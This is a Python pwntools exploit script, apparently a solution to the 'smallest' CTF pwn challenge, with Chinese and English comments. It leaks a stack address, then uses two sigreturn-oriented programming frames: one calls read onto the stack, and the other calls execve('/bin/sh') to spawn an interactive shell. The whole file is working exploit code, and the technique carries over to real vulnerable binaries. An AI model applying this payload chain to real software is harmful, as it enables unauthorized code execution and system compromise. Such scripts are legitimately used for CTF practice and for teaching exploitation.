#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import time
 
context.log_level = 'debug'
context.arch = "amd64"
exe = './smallest'
 
s = process(exe)
 
# 调用write系统调用来泄露栈地址  
# write stack address  
main_addr = 0x4000b0
syscall_addr = 0x4000be
 
write_payload = p64(main_addr) + p64(main_addr) + p64(main_addr)
s.send(write_payload)
 
# 返回地址改写为0x4000b3。 跳过 xor %rax,%rax 使rax保持为1
s.send("\xb3") # set rax=1  write     
stack_addr = u64(s.recv()[8:16])
print hex(stack_addr)
 
# 得到一个栈地址后，让rsp指向stack_addr
# frame 
# call read into stack_addr
# target : get "/bin/sh" addr
frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_read
frame.rdi = 0x0
frame.rsi = stack_addr
frame.rdx = 0x400
frame.rsp = stack_addr
frame.rip = syscall_addr
# frame代表read(0,stack_addr,0x400)  
 
# 现将Payload写到栈上
read_frame_payload = p64(main_addr) + p64(0) + str(frame)
s.send(read_frame_payload)
 
# 通过字符数量，调用sigreturn
goto_sigreturn_payload = p64(syscall_addr) + "\x00"*(15 - 8) # sigreturn syscall is 15 
s.send(goto_sigreturn_payload)
 
# frame 
# call execv("/bin/sh",0,0)
frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_execve
frame.rdi = stack_addr+0x150 # "/bin/sh" 's addr 
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = stack_addr
frame.rip = syscall_addr
 
execv_frame_payload = p64(main_addr) + p64(0) + str(frame)
execv_frame_payload_all = execv_frame_payload + (0x150 - len(execv_frame_payload))*"\x00" + "/bin/sh\x00"
s.send(execv_frame_payload_all)
 
s.send(goto_sigreturn_payload)  
 
s.interactive()
 
